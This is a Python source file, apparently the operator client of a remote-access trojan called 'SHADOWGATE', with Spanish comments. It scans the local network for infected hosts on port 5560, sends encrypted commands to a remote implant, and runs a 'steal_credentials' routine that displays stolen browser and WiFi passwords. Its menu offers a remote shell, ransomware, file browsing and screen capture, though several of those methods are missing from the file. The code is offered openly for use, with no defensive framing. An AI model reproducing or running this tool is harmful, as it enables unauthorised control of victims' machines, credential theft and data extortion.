#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import json
import struct
import threading
from cryptography.fernet import Fernet
from termcolor import colored
import pyfiglet
from tabulate import tabulate


class AdvancedControlClient:
    def __init__(self, target_ip=None, control_port=5560, encryption_key=None):
        self.target_ip = target_ip or self.detect_target()
        self.control_port = control_port
        self.connected = False
        self.socket = None

        if encryption_key:
            self.cipher = Fernet(encryption_key)
        else:
            self.cipher = None

    def detect_target(self):
        """Auto-detección de objetivos en la red"""
        try:
            import netifaces
            gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
            network = '.'.join(gateway.split('.')[:3]) + '.'

            print(colored("🔍 Escaneando red...", 'yellow'))

            for i in range(1, 255):
                ip = network + str(i)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    result = sock.connect_ex((ip, 5560))
                    if result == 0:
                        print(colored(f"✅ Objetivo encontrado: {ip}", 'green'))
                        sock.close()
                        return ip
                    sock.close()
                except:
                    continue

            return input("IP del objetivo: ")
        except:
            return input("IP del objetivo: ")

    def show_banner(self):
        """Mostrar banner atractivo"""
        banner = pyfiglet.figlet_format("SHADOWGATE", font="slant")
        print(colored(banner, 'cyan'))
        print(colored("🕶️  Advanced Remote Control System", 'yellow'))
        print(colored("=" * 60, 'blue'))
        print(colored(f"Target: {self.target_ip}", 'green'))
        print(colored("=" * 60, 'blue'))

    def connect(self):
        """Conexión mejorada con feedback visual"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.target_ip, self.control_port))
            self.connected = True

            print(colored("✅ Conexión establecida exitosamente!", 'green'))
            return True

        except Exception as e:
            print(colored(f"❌ Error de conexión: {e}", 'red'))
            return False

    def send_command(self, command_type, data, wait_response=True):
        """Envío de comandos con formato mejorado"""
        if not self.connected:
            if not self.connect():
                return None

        try:
            command = {'type': command_type, 'data': data}

            if self.cipher:
                encrypted_data = self.cipher.encrypt(json.dumps(command).encode())
                self.socket.sendall(struct.pack('!I', len(encrypted_data)))
                self.socket.sendall(encrypted_data)
            else:
                json_data = json.dumps(command).encode()
                self.socket.sendall(struct.pack('!I', len(json_data)))
                self.socket.sendall(json_data)

            if wait_response:
                return self._receive_response()
            return True

        except Exception as e:
            print(colored(f"❌ Error enviando comando: {e}", 'red'))
            return None

    def _receive_response(self):
        """Recepción de respuestas"""
        try:
            size_data = self.socket.recv(4)
            if not size_data:
                return None

            size = struct.unpack('!I', size_data)[0]
            response_data = b''

            while len(response_data) < size:
                chunk = self.socket.recv(min(4096, size - len(response_data)))
                if not chunk:
                    return None
                response_data += chunk

            if self.cipher:
                decrypted_data = self.cipher.decrypt(response_data)
                return json.loads(decrypted_data.decode())
            else:
                return json.loads(response_data.decode())

        except Exception as e:
            print(colored(f"❌ Error recibiendo respuesta: {e}", 'red'))
            return None

    def steal_credentials(self):
        """Robar credenciales de forma stealth"""
        print(colored("🕵️‍♂️ Robando credenciales...", 'yellow'))

        result = self.send_command('credential_stealer', {'action': 'run'})

        if result and result.get('success'):
            credentials = result.get('data', {})

            # Mostrar resultados en tabla
            if credentials.get('passwords'):
                print(colored("\n🔑 CONTRASEÑAS ENCONTRADAS:", 'green'))
                for browser, data in credentials['passwords'].items():
                    if isinstance(data, list) and data:
                        table_data = []
                        for item in data[:5]:  # Mostrar solo 5 por browser
                            table_data.append([
                                browser,
                                item['url'][:30] + '...' if len(item['url']) > 30 else item['url'],
                                item['username'],
                                item['password'][:20] + '...' if len(item['password']) > 20 else item['password']
                            ])
                        print(tabulate(table_data,
                                       headers=['Browser', 'URL', 'Username', 'Password'],
                                       tablefmt='grid'))

            if credentials.get('wifi'):
                print(colored("\n📶 WiFi PASSWORDS:", 'cyan'))
                wifi_table = []
                for wifi in credentials['wifi']:
                    wifi_table.append([wifi['ssid'], wifi['password']])
                print(tabulate(wifi_table,
                               headers=['SSID', 'Password'],
                               tablefmt='grid'))

            return credentials
        else:
            print(colored("❌ Error robando credenciales", 'red'))
            return None

    def interactive_menu(self):
        """Menú interactivo mejorado"""
        self.show_banner()

        while True:
            print("\n" + "=" * 60)
            print(colored("🎮 MENÚ PRINCIPAL", 'magenta', attrs=['bold']))
            print("=" * 60)

            menu_options = [
                ["1", "📊 System Info", "Información del sistema"],
                ["2", "🕵️‍♂️ Steal Credentials", "Robar credenciales"],
                ["3", "🖥️ Remote Shell", "Terminal remota"],
                ["4", "🔒 Ransomware", "Encriptar/Desencriptar"],
                ["5", "📁 File Explorer", "Explorador de archivos"],
                ["6", "📸 Screenshot", "Capturar pantalla"],
                ["7", "🎥 Live Screen", "Ver pantalla en vivo"],
                ["8", "📡 Network Info", "Información de red"],
                ["9", "⚙️ Advanced Options", "Opciones avanzadas"],
                ["0", "🚪 Exit", "Salir"]
            ]

            print(tabulate(menu_options,
                           headers=['', 'Option', 'Description'],
                           tablefmt='pretty'))

            choice = input("\n" + colored("👉 Selecciona una opción: ", 'yellow')).strip()

            if choice == "1":
                self.execute_command("systeminfo")

            elif choice == "2":
                self.steal_credentials()

            elif choice == "3":
                self.remote_shell()

            elif choice == "4":
                self.ransomware_menu()

            elif choice == "5":
                self.file_explorer()

            elif choice == "6":
                self.capture_screenshot()

            elif choice == "7":
                self.live_screen()

            elif choice == "8":
                self.network_info()

            elif choice == "9":
                self.advanced_menu()

            elif choice == "0":
                print(colored("👋 Saliendo...", 'blue'))
                break

            else:
                print(colored("❌ Opción no válida", 'red'))

            input(colored("\n📍 Presiona Enter para continuar...", 'cyan'))

    def execute_command(self, command):
        """Ejecutar comando con output formateado"""
        result = self.send_command('system_command', {'command': command})

        if result and result.get('success'):
            print(colored("✅ Comando ejecutado exitosamente!", 'green'))
            print(colored("Output:", 'yellow'))
            print(result.get('output', ''))

            if result.get('error'):
                print(colored("Errors:", 'red'))
                print(result.get('error', ''))
        else:
            print(colored("❌ Error ejecutando comando", 'red'))


# Ejecución principal
if __name__ == "__main__":
    client = AdvancedControlClient()
    client.interactive_menu()